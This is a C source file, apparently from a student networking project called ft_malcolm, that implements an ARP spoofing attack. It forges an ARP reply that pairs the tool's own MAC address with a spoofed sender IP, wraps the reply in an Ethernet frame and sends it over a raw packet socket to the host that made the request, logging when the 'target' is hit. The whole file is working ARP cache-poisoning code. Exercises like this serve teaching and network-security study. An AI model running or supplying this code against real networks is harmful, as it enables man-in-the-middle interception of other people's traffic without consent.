//
// Created by loumouli on 12/13/23.
//

#include "ft_malcolm.h"

static void base_init_packet(t_packet* packet) {
  ft_memset(packet, 0, sizeof(*packet));
  packet->ar_hrd = htons(HW_TYPE_ETHERNET);
  packet->ar_pro = htons(ETH_P_IP);
  packet->ar_hln = LEN_HW_ETHERNET;
  packet->ar_pln = LEN_PROTO_IPV4;
  packet->ar_op = htons(ARPOP_REPLY);
}

static void fill_field_packet(t_packet* packet, const uint8_t* sender_mac, const uint8_t* sender_ip,
                              const uint8_t* target_mac, const uint8_t* target_ip) {
  uint32_t tmp_int;
  ft_memcpy(packet->ar_sha, sender_mac, 6); // my mac address
  tmp_int = inet_addr((const char*)sender_ip);
  ft_memcpy(packet->ar_sip, &tmp_int, 4); // src ip target
  ft_memcpy(packet->ar_tha, target_mac, 6); // target mac address
  ft_memcpy(packet->ar_tip, target_ip, 4); // target ip address
}

static void init_ether_frame(ethernet_frame* frame, const void* dest_addr, const void* src_addr, const void* payload) {
  ft_memset(frame, 0, sizeof(*frame));
  ft_memcpy(frame->dest_addr, dest_addr, 6);
  ft_memcpy(frame->src_addr, src_addr, 6);
  const uint16_t ether_type = htons(ETH_P_ARP);
  ft_memcpy(&frame->ethertype, &ether_type, sizeof(uint16_t));
  ft_memcpy(frame->data, payload, sizeof(t_packet));
}

static void init_dest_struct(struct sockaddr_ll* dest, const t_malcolm* mal) {
  ft_memset(dest, 0, sizeof(*dest));
  dest->sll_family = AF_PACKET;
  dest->sll_protocol = htons(ETH_P_ARP);
  dest->sll_ifindex = (int32_t)mal->index;
  dest->sll_hatype = htons(ARPHRD_ETHER);
  dest->sll_halen = ETH_ALEN;
  dest->sll_pkttype = PACKET_OTHERHOST;
}

void spoof_back_request(const t_malcolm* malcolm, const ethernet_frame* eth_frame) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest = {0};

  dprintf(1, GREEN "LOG:\t\tPreparing spoofing response...\n" RESET);
  base_init_packet(&packet); // init packet whith common options

  // init packet with runtime information
  fill_field_packet(&packet, malcolm->mac_src_byte_arr, malcolm->ip_src, eth_frame->src_addr,
                    ((t_packet*)eth_frame->data)->ar_sip);
  // inter ethernet frame
  init_ether_frame(&frame, eth_frame->src_addr, malcolm->mac_src_byte_arr, &packet);
  // init dest struct to IPV4, ARP Packet, etc
  init_dest_struct(&dest, malcolm);

#ifdef VERBOSE
  dprintf(1, "\n");
  dprintf(1, GREEN "LOG:\t\tPRINTING PACKET:\n\n");
  print_arp_packet(&packet);
  dprintf(1, "\n");
  dprintf(1, "LOG:\t\tPRINTING FRAME:\n\n");
  print_ethernet_frame(&frame);
  dprintf(1, RESET "\n");
#endif

  dprintf(1, GREEN "LOG:\t\tLaunching respongse...\n" RESET);
  // send ethernet frame + arp packe to dest
  const ssize_t byte_send = sendto(malcolm->sock, &frame, sizeof(frame), 0, (struct sockaddr*)&dest, sizeof(dest));
  if (byte_send == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
  if (byte_send == sizeof(frame))
    dprintf(1, GREEN "LOG:\t\tTarget hit by repsonse !\n" RESET);
}
